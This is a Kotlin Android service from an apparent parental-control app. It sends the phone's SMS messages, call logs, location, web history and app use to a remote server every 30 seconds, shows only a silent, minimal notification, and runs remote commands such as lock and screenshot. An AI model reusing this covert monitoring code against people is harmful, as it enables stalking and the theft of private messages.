package com.parentalcontrol.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import com.parentalcontrol.app.api.ApiClient
import com.parentalcontrol.app.api.CloudConfig
import com.parentalcontrol.app.utils.Collectors
import kotlinx.coroutines.*
import org.json.JSONObject

class TrackerService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private val collectors = Collectors()
    private var lastForegroundApp: String? = null
    private var configRefreshJob: Job? = null
    private var updateCheckJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        TrackerService.isRunning = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)
        startPeriodicReporting()
        startConfigRefresh()
        startUpdateChecker()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        TrackerService.isRunning = false
        releaseWakeLock()
        updateCheckJob?.cancel()
        scope.cancel()
    }

    private var job: Job? = null

    private fun startPeriodicReporting() {
        job = scope.launch {
            // Initial registration
            try {
                val deviceInfo = collectors.collectDeviceInfo(this@TrackerService)
                ApiClient.registerDevice(deviceInfo)
            } catch (e: Exception) { e.printStackTrace() }

            while (true) {
                try {
                    collectAndReport()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(30_000L) // 30 seconds
            }
        }
    }

    private fun startConfigRefresh() {
        configRefreshJob = scope.launch {
            while (true) {
                try {
                    fetchAndApplyConfig()
                } catch (e: Exception) { e.printStackTrace() }
                delay(60_000L)
            }
        }
    }

    private fun startUpdateChecker() {
        updateCheckJob = scope.launch {
            delay(30_000L)
            while (true) {
                try {
                    UpdateManager.checkForUpdate(this@TrackerService)
                } catch (e: Exception) { e.printStackTrace() }
                delay(3600_000L)
            }
        }
    }

    private suspend fun fetchAndApplyConfig() {
        val config = ApiClient.getDeviceConfig() ?: return

        // Handle pending commands
        val commands = config.optJSONArray("commands")
        if (commands != null) {
            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                handleCommand(cmd)
            }
        }

        // Update reporting interval
        config.optInt("reporting_interval", 300).let {
            // Will be used on next report cycle
        }
    }

    private suspend fun handleCommand(cmd: JSONObject) {
        val commandId = cmd.getString("id")
        val command = cmd.getString("command")
        val params = cmd.optJSONObject("params")

        try {
            ApiClient.updateCommandStatus(commandId, "delivered")
        } catch (e: Exception) {}

        when (command) {
            "lock" -> {
                // Lock screen via device admin
                try {
                    val lockIntent = Intent(this, MainActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        putExtra("action", "lock")
                    }
                    startActivity(lockIntent)
                } catch (e: Exception) {}
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "screenshot" -> {
                // Request screenshot - handled by Activity
                try {
                    val intent = Intent(this, MainActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        putExtra("action", "screenshot")
                    }
                    startActivity(intent)
                } catch (e: Exception) {}
            }
            "alarm" -> {
                val duration = params?.optInt("duration", 30) ?: 30
                val alarmIntent = Intent(this, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra("action", "alarm")
                    putExtra("duration", duration)
                }
                startActivity(alarmIntent)
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "wipe" -> {
                // Alert parent instead of actually wiping
                ApiClient.updateCommandStatus(commandId, "failed")
            }
            "block_apps" -> {
                // Store blocked apps list - the AccessibilityService handles it
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            else -> {
                ApiClient.updateCommandStatus(commandId, "completed")
            }
        }
    }

    private suspend fun collectAndReport() {
        val context = this@TrackerService

        val deviceInfo = collectors.collectDeviceInfo(context)
        val location = collectors.collectLocation(context)
        val batteryInfo = collectors.collectBatteryInfo(context)
        val smsMessages = collectors.collectSmsMessages(context)
        val callLogs = collectors.collectCallLogs(context)
        val installedApps = collectors.collectInstalledApps(context)

        // Collect activities (foreground app changes)
        val activities = mutableListOf<JSONObject>()
        val foregroundApp = collectors.collectForegroundApp(context)
        if (foregroundApp != null && foregroundApp != lastForegroundApp) {
            lastForegroundApp = foregroundApp
            val appName = collectors.getAppName(context, foregroundApp)
            activities.add(JSONObject().apply {
                put("activity_type", "app_launch")
                put("package_name", foregroundApp)
                put("app_name", appName)
                put("timestamp", System.currentTimeMillis())
            })
        }

        // Collect screen time (daily)
        val screentime = collectors.collectScreenTime(context)

        // Collect web history (non-Android 10+)
        val webHistory = collectors.collectWebHistory(context)

        val payload = ApiClient.buildReportPayload(
            deviceInfo = deviceInfo,
            location = location,
            battery = batteryInfo,
            smsMessages = smsMessages,
            callLogs = callLogs,
            installedApps = installedApps,
            activities = activities,
            screentime = screentime,
            webHistory = webHistory
        )

        val result = ApiClient.sendBulkReport(payload)

        if (result.success) {
            // Handle any pending commands from response
            result.commands?.forEach { cmd ->
                handleCommand(cmd)
            }
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = getString(R.string.notification_channel_desc)
            setShowBadge(false)
            enableVibration(false)
            setSound(null, null)
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "ParentalControl:TrackerWakeLock"
        )
        wakeLock?.acquire(10 * 60 * 1000L)
    }

    private fun releaseWakeLock() {
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
    }

    companion object {
        private const val CHANNEL_ID = "parental_control_channel"
        private const val NOTIFICATION_ID = 1
        const val REPORT_INTERVAL_MS = 30_000L

        @Volatile
        var isRunning = false
            private set

        fun start(context: Context) {
            val intent = Intent(context, TrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            isRunning = false
            val intent = Intent(context, TrackerService::class.java)
            context.stopService(intent)
        }
    }
}
